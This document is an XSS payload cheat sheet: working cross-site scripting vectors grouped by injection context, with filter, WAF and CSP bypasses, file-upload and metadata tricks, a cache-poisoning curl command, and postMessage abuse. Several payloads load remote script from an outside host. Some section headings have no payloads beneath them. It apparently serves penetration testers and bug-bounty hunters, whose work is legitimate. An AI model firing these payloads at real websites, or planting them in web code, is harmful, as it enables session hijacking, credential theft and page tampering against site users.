
## HTML Injection

**Use when input lands inside an attribute’s value of an HTML tag or outside tag except the ones described in the next case. Prepend a “-->” to payload if input lands in HTML comments.**

- `<svg onload=alert(1)>`
- `"><svg onload=alert(1)>`

## HTML Injection – Tag Block Breakout

**Use when input lands inside or between opening/closing of the following tags: <title><style><script><textarea><noscript><pre><xmp> and <iframe> (</tag> is accordingly).**

- `</tag><svg onload=alert(1)>`
- `"></tag><svg onload=alert(1)>`

## HTML Injection - Inline 

**Use when input lands inside an attribute’s value of an HTML tag but that tag can’t be terminated by a greater than sign (>).**

- `"onmouseover=alert(1) //`
- `"autofocus onfocus=alert(1) //`
- `javascript:alert(1)`
- `'-alert(1)-'`
- `'/alert(1)//`

## HTML Injection - Source 

**Use when input lands as a value of the following HTML tag attributes: href, src, data, or action (also formaction). Src attribute in script tags can be a URL or “data:,alert(1)”.**

## Javascript Injection

**Use when input lands in a script block, inside a string delimited value.**

## Javascript Injection - Escape Bypass

**Use when input lands in a script block, inside a string delimited value but quotes are escaped by a backslash.**

- `\'/alert(1)//`

## Javascript Injection – Script Breakout 

**Use when input lands anywhere within a script block.**

- `</script><svg onload=alert(1)>`


## Javascript Injection - Logical Block

**Use 1st or 2nd payloads when input lands in a script block, inside a string delimited value, and inside a single logical block like a function or conditional (if, else, etc). If the quote is escaped with a backslash, use the 3rd payload.**

- `'}alert(1);{'`
- `'}alert(1)%0A{'`
- `\'})alert(1);{//`

## Javascript Injection - Quoteless

**Use when there’s multi-reflection on the same line of JS code. The 1st payload works in simple JS variables, and the 2nd one works in non-nested JS objects.**

- `/alert(1)//\`
- `/alert(1)}//\`

## Javascript Context - Placeholder Injection in Template Literal

**Use when input lands inside backticks (``) delimited strings or in template engines.**

- `${alert(1)}`

## Multi Reflection HTML Injection - Double Reflection (Single Input)

**Use to take advantage of multiple reflections on the same page.**

- `'onload=alert(1)><svg/1='`
- `'>alert(1)</script><script/1='`
- `*/alert(1)</script><script>/*`
- `*/alert(1)">'onload="/*<svg/1='`
- \``-alert(1)">'onload="`<svg/1='
- `*/</script>'>alert(1)/*<script/1='`

## Multi Reflection HTML Injection - Triple Reflection (Single Input)

**Use to take advantage of multiple reflections on the same page.**

## Multi Input Reflections HTML Injection - Double & Triple

**Use to take advantage of multiple input reflections on the same page. Also useful in HPP (HTTP Parameter Pollution) scenarios, where there are reflections for repeated parameters. The 3rd payload makes use of comma-separated reflections of the same parameter.**

- `p=<svg/1='&q='onload=alert(1)>'`
- `p=<svg 1='&q='onload='/*&r=*/alert(1)>'`
- `q=<script/&q=/src=data:&q=alert(1)>`

## File Upload Injection – Filename

**Use when the uploaded filename is reflected somewhere on the target page.**

- `"><svg onload=alert(1)>.gif`

## File Upload Injection – Metadata

**Use when metadata of the uploaded file is reflected somewhere on the target page. It uses command-line exiftool.**

```bash
$ exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg
```

## File Upload Injection – SVG File

**Use to create a stored XSS on the target when uploading image files. Save content below as "xss.svg".**

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

## DOM Insert Injection

**Use to test for XSS when injection gets inserted into DOM as valid markup instead of being reflected in source code.**

- `<img src=1 onerror=alert(1)>`
- `<iframe src=javascript:alert(1)>`
- `<details open ontoggle=alert(1)>`
- `<svg><svg onload=alert(1)>`

## DOM Insert Injection – Resource Request

**Use when native JavaScript code inserts into the page the results of a request to a URL that can be controlled by the attacker.**

- `data:text/html,<img src=1 onerror=alert(1)>`
- `data:text/html,<iframe src=javascript:alert(1)>`

## PHP Self URL Injection

**Use when the current URL is used by the target’s underlying PHP code as an attribute value of an HTML form.**

- `https://brutelogic.com.br/xss.php/"><svg onload=alert(1)>?a=reader`

## Markdown Vector

**Use in text boxes, comment sections, etc that allow some markup input. Click to fire.**

[clickme](javascript:alert`1`)


## Script Injection - No Closing Tag

**Use when there’s a closing script tag (</script>) somewhere in the code after reflection.**

- `<script src=data:,alert(1)>`
- `<script src=//brutelogic.com.br/1.js>`

## Javascript postMessage() DOM Injection (with Iframe)

**Use when there’s a “message” event listener like in “window.addEventListener(‘message’, ...)” in JavaScript code without a check for origin. Target must be able to be framed (X-Frame Options header according to context).**

```html
<iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')">
```

## XML-Based XSS

**Use to inject XSS vector in an XML page (content types text/xml or application/xml). Prepend a “-->” to payload if input lands in a comment section or “]]>” if input lands in a CDATA section.**

- `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>`
- `<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>`
- `{{$new.constructor('alert(1)')()}}`
- `<x ng-app>{{$new.constructor('alert(1)')()}}`

## AngularJS Injections (v1.6 and up)

**Use when there’s an AngularJS library loaded in the page, inside an HTML block with ng-app directive (1st payload) or creating your own (2nd one).**

## Onscroll Universal Vector

**Use to XSS without user interaction when using onscroll event handler. It works with address, blockquote, body, center, dir, div, dl, dt, form, li, menu, ol, p, pre, ul, and h1 to h6 HTML tags.**

- `<p style=overflow:auto;font-size:999px onscroll=alert(1)>AAA<x/id=y></p>#y`

## Type Juggling

**Use to pass an “if” condition matching a number in loose comparisons.**

- `1<svg onload=alert(1)>`
- `1"><svg onload=alert(1)>`

## XSS in SSI

**Use when there’s a Server-Side Include (SSI) injection.**

- `<<!--%23set var="x" value="svg onload=alert(1)"--><!--%23echo var="x"-->`

## SQLi Error-Based XSS

**Use in endpoints where a SQL error message can be triggered (with a quote or backslash).**

- `'1<svg onload=alert(1)>`
- `<svg onload=alert(1)>\`

## Injection in JSP Path

**Use in JSP-based applications in the path of URL.**

- `//DOMAIN/PATH/;<svg onload=alert(1)>`
- `//DOMAIN/PATH/;"><svg onload=alert(1)>`

## JS Injection - ReferenceError Fix

**Use to fix the syntax of some hanging JavaScript code. Check console tab in Browser Developer Tools (F12) for the respective ReferenceError and replace var and function names accordingly.**

- `';alert(1);var myObj='`
- `';alert(1);function myFunc(){}`

## Bootstrap Vector (up to v3.4.0)

**Use when there’s a bootstrap library present on page. It also bypasses Webkit Auditor, just click anywhere on the page to trigger. Any character of href value can be HTML encoded to bypass filters.**

- `<html data-toggle=tab href="<img src=x onerror=alert(1)>">`

## Browser Notification

**Use as an alternative to alert, prompt, and confirm popups. It requires user acceptance (1st payload) but once the user has authorized previously for that site, the 2nd one can be used.**

- `Notification.requestPermission(x=>{new(Notification)(1)})`
- `new(Notification)(1)`

## XSS in HTTP Header - Cached

**Use to store an XSS vector in the application by using the MISS-MISS-HIT cache scheme (if there’s one in place). Replace <XSS> with your respective vector and TARGET with a dummy string to avoid the actual cached version of the page. Fire the same request 3 times.**

- `$ curl -H "Vulnerable_Header: <XSS>" TARGET/?dummy_string`

## Mixed Case

**Use to bypass case-sensitive filters.**

- `<Svg OnLoad=alert(1)>`
- `<Script>alert(1)</Script>`

## Unclosed Tags

**Use in HTML injections to avoid filtering based on the presence of both less than (<) and greater than (>) signs. It requires a native greater than sign in the source code after input reflection.**

- `<svg onload=alert(1)//`
- `<svg onload="alert(1)"`

## Uppercase XSS

**Use when the application reflects input in uppercase. Replace “&” with “%26” and “#” with “%23” in URLs.**

- `<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>`
- `<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>`
- `<script/x>alert(1)</script>`

## Extra Content for Script Tags

**Use when the filter looks for “<script>” or “<script src=...” with some variations but without checking for other non-required attributes.**

## Double Encoded XSS

**Use when the application performs double decoding of input.**

- `%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E`
- `%2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E`

## Alert without Parentheses (Strings Only)

**Use in an HTML vector or JavaScript injection when parentheses are not allowed and a simple alert box is enough.**

- `alert`1``

## Alert without Parentheses

**Use in an HTML vector or JavaScript injection when parentheses are not allowed and the Proof of Concept (PoC) requires returning any target info.**

- `setTimeout`alert\x28document.domain\x29``  
- `setInterval`alert\x28document.domain\x29``

## Alert without Parentheses – HTML Entities

**Use only in HTML injections when parentheses are not allowed. Replace “&” with “%26” and “#” with “%23” in URLs.**

- `<svg onload=alert&lpar;1&rpar;>`
- `<svg onload=alert&#40;1&#41;>`

## Alert without Alphabetic Chars

**Use when alphabetic characters are not allowed.**

## Alert Obfuscation

**Use to trick several regular expression (regex) filters.**

- `(alert)(1)`
- `a=alert,a(1)`
- `[1].find(alert)`

## Alert Alternative – Write & Writeln

**Use as an alternative to alert, prompt, and confirm. If used within an HTML vector it can be used as it is but if it’s a JS injection the full “document.write” form is required.**

- `write`XSSed!``
- `write`<img/src/o&#78error=alert&lpar;1)&gt;``

## Alert Alternative – Open Pseudo-Protocol

**Use as an alternative to alert, prompt, and confirm.**

- `top.open`javas\cript:al\ert\x281\x29``
- `top.open`javas\cript:al\ert\x281\x29${0}0``

## Alert Alternative - Eval + URL

**Use as an alternative to call alert, prompt, and confirm.**

- `<svg onload=eval(" ' "+URL)>`
- `<svg id=eval onload=top[id](" ' "+URL)>`

## Alert Alternative - Eval + URL with Template Literal

**Use as an alternative to call alert, prompt, and confirm.**

- `${alert(1)}<svg onload=eval('`//'+URL)>`

## HTML Injection - Inline Alternative

**Use to bypass blacklists.**

- `"onpointerover=alert(1) //`
- `"autofocus onfocusin=alert(1) //`
- `"o<x>nmouseover=alert<x>(1)//`
- `"autof<x>ocus o<x>nfocus=alert<x>(1)//`
- `GIF89a=//<script>`
- `alert(1)//</script>;`

## Strip-Tags Based Bypass

**Use when the filter strips out anything between a < and > characters like PHP’s strip_tags() function. Inline injection only.**

## File Upload Injection – HTML/js GIF Disguise

**Use to bypass CSP via file upload.**

## Jump to URL Fragment

**Use when you need to hide some characters from your payload that would trigger a WAF for example.**

- `eval(URL.slice(-8)) #alert(1)`
- `eval(location.hash.slice(1)) #alert(1)`
- `document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>`

## Second Order XSS Injection

**Use when your input will be used twice, like stored normalized in a database and then retrieved for later use or inserted into DOM.**

- `&lt;svg/onload&equals;alert(1)&gt;`

## PHP Spell Checker Bypass

**Use to bypass PHP’s pspell_new function which provides a dictionary to try to guess the input used to search.**

- `<scrpt> confirm(1) </scrpt>`

## Event Origin Bypass for postMessage() XSS

**Use when a check for origin can be bypassed in JavaScript code of the target by prepending one of the allowed origins as a subdomain of the attacking domain that will send the payload.**

## CSP Bypass (for Whitelisted Google Domains)

**Use when there’s a CSP (Content-Security Policy) that allows execution from these domains.**

## SVG Vectors with Event Handlers

**Use against blacklists.**

- `<svg><set onbegin=alert(1)>`
- `<svg><set end=1 onend=alert(1)>`

## SVG Vectors without Event Handlers

**Use to avoid filters looking for event handlers or src, data, etc.**

- `<svg><a><rect width=99% height=99% /><animate attributeName=href to=javascript:alert(1)>`
- `<svg><a><rect width=99% height=99% /><animate attributeName=href values=javascript:alert(1)>`
- `<svg><a><rect width=99% height=99% /><animate attributeName=href to=0 from=javascript:alert(1)>`
- `<svg><use xlink:href=data:image/svg+xml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI%2BPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>`
